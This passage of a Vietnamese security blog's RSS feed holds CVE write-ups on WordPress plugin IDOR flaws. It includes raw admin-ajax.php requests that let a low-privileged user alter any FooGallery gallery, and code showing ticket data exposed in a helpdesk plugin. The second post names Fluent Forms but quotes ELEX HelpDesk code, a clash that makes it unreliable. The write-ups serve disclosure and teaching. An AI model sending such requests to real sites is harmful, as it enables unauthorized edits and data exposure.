foogallery-modal-nonce&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Extract img_id from request&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;No capability / ownership check (edit_post)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;do_action(foogallery_attachment_save_data, img_id, data)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Update post / attachment data&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Unauthorized modification of arbitrary gallery/post (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán edit galery v·ªõi user c√≥ quy·ªÅn &lt;code&gt;Gallery Creator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Search t·ª´ kh√≥a &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt; v√† l·∫•y nonce t·ª´ response&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request ƒë·ªÉ l·∫•y nonce t∆∞∆°ng ·ª©ng v·ªõi form &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_open&amp;amp;nonce=9ad3ed3e9b&amp;amp;img_id=1&amp;amp;gallery_id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; title=&#34;L·∫•y nonce t·ª´ response&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce t·ª´ response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;656&#34; width=&#34;954&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce t·ª´ response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request ƒë·ªÉ thay ƒë·ªïi data c·ªßa gallery b·∫•t k·ª≥&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_save&amp;amp;nonce=11bfc5f814&amp;amp;foogallery[]=any_data&amp;amp;img_id=1&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng UI ƒë·ªÉ th·ª±c hi·ªán:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy c·∫≠p &lt;code&gt;http://localhost/wp-admin/post.php?post=post_id&amp;amp;action=edit#&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán edit v√† save&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#34; title=&#34;Edit and save&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Edit&lt;/h2&gt;&lt;p&gt;Edit and save&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#39; alt=&#34;Edit&#34; height=&#34;1002&#34; width=&#34;1879&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit and save&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do &lt;strong&gt;thi·∫øu ki·ªÉm tra quy·ªÅn truy c·∫≠p (authorization)&lt;/strong&gt; ƒë·ªëi v·ªõi &lt;code&gt;img_id&lt;/code&gt;.&lt;br&gt;&#xA;M·∫∑c d√π c√≥ ki·ªÉm tra nonce, plugin v·∫´n cho ph√©p ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p thao t√°c l√™n &lt;strong&gt;gallery kh√¥ng thu·ªôc quy·ªÅn s·ªü h·ªØu&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;br&gt;&#xA;B·∫£n v√° 2.4.30 kh·∫Øc ph·ª•c b·∫±ng c√°ch ki·ªÉm tra &lt;code&gt;current_user_can( &#39;edit_post&#39;, $img_id )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce &lt;strong&gt;kh√¥ng thay th·∫ø&lt;/strong&gt; cho ki·ªÉm so√°t quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;Ph·∫£i ki·ªÉm tra quy·ªÅn theo &lt;strong&gt;ƒë·ªëi t∆∞·ª£ng c·ª• th·ªÉ (object-level)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng tin d·ªØ li·ªáu client, k·ªÉ c·∫£ khi c√≥ nonce&lt;/li&gt;&#xA;&lt;li&gt;IDOR th∆∞·ªùng xu·∫•t hi·ªán trong AJAX handler thi·∫øu &lt;code&gt;current_user_can()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin &amp;lt;= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10039 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</link>
      <pubDate>Sun, 28 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms ‚Äì Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; t·ªìn t·∫°i &lt;strong&gt;l·ªó h·ªïng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n &lt;strong&gt;‚â§ 3.2.9&lt;/strong&gt; th√¥ng qua tham s·ªë &lt;code&gt;submission_id&lt;/code&gt; trong endpoint x√°c nh·∫≠n thanh to√°n SCA.&#xA;L·ªó h·ªïng cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;ƒë√°nh d·∫•u submission c·ªßa ng∆∞·ªùi kh√°c l√† failed&lt;/strong&gt;, g√¢y gi√°n ƒëo·∫°n qu√° tr√¨nh thanh to√°n.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10039&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10039&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elex-helpdesk-customer-support-ticket-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.2.9&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_eh_crm_ticket_single_view_client&amp;#39;, array( &amp;#39;CRM_Ajax&amp;#39;, &amp;#39;eh_crm_ticket_single_view_client&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (Subcriber+). Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=eh_crm_ticket_single_view_client&lt;/code&gt; th√¨ callback &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client() {&#xA;    if ( wp_verify_nonce( isset( $_POST[&amp;#39;nonce&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;nonce&amp;#39;] ) : &amp;#39;&amp;#39;, &amp;#39;wsdesk_nonce&amp;#39; ) ) {&#xA;        $ticket_id = isset( $_POST[&amp;#39;ticket_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;ticket_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $content   = self::eh_crm_ticket_single_view_client_gen( $ticket_id );&#xA;        wp_send_json_success( array( &amp;#39;page&amp;#39; =&amp;gt; $content ) );&#xA;        die;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra &lt;code&gt;nonce&lt;/code&gt; gi√∫p ch·ªëng CSRF&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ l·∫•y &lt;code&gt;ticket_id&lt;/code&gt; t·ª´ request, g·ªçi h√†m &lt;code&gt;eh_crm_ticket_single_view_client_gen()&lt;/code&gt; x·ª≠ l√Ω, l·∫•y n·ªôi dung c·ªßa ticket t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;ticker_id&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng tr·∫£ v·ªÅ n·ªôi dung d·∫°ng JSON.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) {&#xA;&#xA;    // L·∫•y d·ªØ li·ªáu ticket d·ª±a tr√™n ticket_id do user truy·ªÅn v√†o&#xA;    $current      = eh_crm_get_ticket( array( &amp;#39;ticket_id&amp;#39; =&amp;gt; $ticket_id ) );&#xA;    $current_meta = eh_crm_get_ticketmeta( $ticket_id );&#xA;&#xA;    // L·∫•y th√¥ng tin ng∆∞·ªùi d√πng n·ªôi b·ªô (agent/admin)&#xA;    $users_data = get_users( array(&#xA;        &amp;#39;role__in&amp;#39; =&amp;gt; array( &amp;#39;administrator&amp;#39;, &amp;#39;WSDesk_Agents&amp;#39;, &amp;#39;WSDesk_Supervisor&amp;#39; )&#xA;    ));&#xA;&#xA;    ...&#xA;&#xA;    // Render n·ªôi dung ticket (HTML output)&#xA;    echo esc_html( $current[0][&amp;#39;ticket_title&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_email&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_date&amp;#39;] );&#xA;&#xA;    ...&#xA;&#xA;    // Hi·ªÉn th·ªã n·ªôi dung h·ªôi tho·∫°i, file ƒë√≠nh k√®m, metadata&#xA;    self::eh_crm_ticket_reply_section_gen_client( $ticket_id );&#xA;&#xA;    ...&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;eh_crm_ticket_single_view_client_gen&lt;/code&gt; v√† &lt;code&gt;eh_crm_get_ticketmeta&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ truy xu·∫•t d·ªØ li·ªáu c·ªßa ticket:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticket( $args, $fields = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;$query = wpFluent()-&amp;gt;table( tables: &amp;#39;wsdesk_tickets&amp;#39; )-&amp;gt;where( &amp;#39;ticket_trash&amp;#39;, 0 );&#xA;&#xA;&#x9;if ( null !== $fields ) {&#xA;&#x9;&#x9;$fields = is_array( $fields ) ? $fields : array( $fields );&#xA;&#x9;&#x9;foreach ( $fields as $field ) {&#xA;&#x9;&#x9;&#x9;$query-&amp;gt;select( $field );&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( is_array( $args ) ) {&#xA;&#x9;&#x9;foreach ( $args as $key =&amp;gt; $value ) {&#xA;&#x9;&#x9;&#x9;$allowed_fileds = array( &amp;#39;ticket_id&amp;#39;, &amp;#39;ticket_author&amp;#39;, &amp;#39;ticket_email&amp;#39;, &amp;#39;ticket_date&amp;#39;, &amp;#39;ticket_title&amp;#39;, &amp;#39;ticket_parent&amp;#39;, &amp;#39;ticket_category&amp;#39;, &amp;#39;ticket_vendor&amp;#39;, &amp;#39;ticket_trash&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( in_array( $key, $allowed_fileds, true ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$query-&amp;gt;where( $key, $value );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;$ticket = (array) $query-&amp;gt;first();&#xA;&#xA;&#x9;if ( ! $ticket ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#xA;&#x9;if ( isset( $ticket[&amp;#39;ticket_content&amp;#39;] ) ) {&#xA;&#x9;&#x9;$ticket[&amp;#39;ticket_content&amp;#39;] = wp_kses_post( $ticket[&amp;#39;ticket_content&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;return array( $ticket );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticketmeta( $id, $key = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;global $wpdb;&#xA;&#x9;$data     = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d&amp;#39;, (int) $id ), ARRAY_A );&#xA;&#x9;$retrived = array();&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;$data = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s&amp;#39;, (int) $id, $key ), ARRAY_A );&#xA;&#x9;}&#xA;&#x9;if ( ! $data ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;return maybe_unserialize( $data[0][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;for ( $i = 0; $i &amp;lt; count( $data ); $i&amp;#43;&amp;#43; ) {&#xA;&#x9;&#x9;$retrived[ $data[ $i ][&amp;#39;meta_key&amp;#39;] ] = maybe_unserialize( $data[ $i ][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;return maybe_unserialize( $retrived );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra n√†o ƒë·ªÉ x√°c nh·∫≠n ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ ph·∫£i l√† ch·ªß s·ªü h·ªØu ticket hay kh√¥ng, c√≥ quy·ªÅn xem ticket n√†y hay kh√¥ng =&amp;gt; IDOR&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div 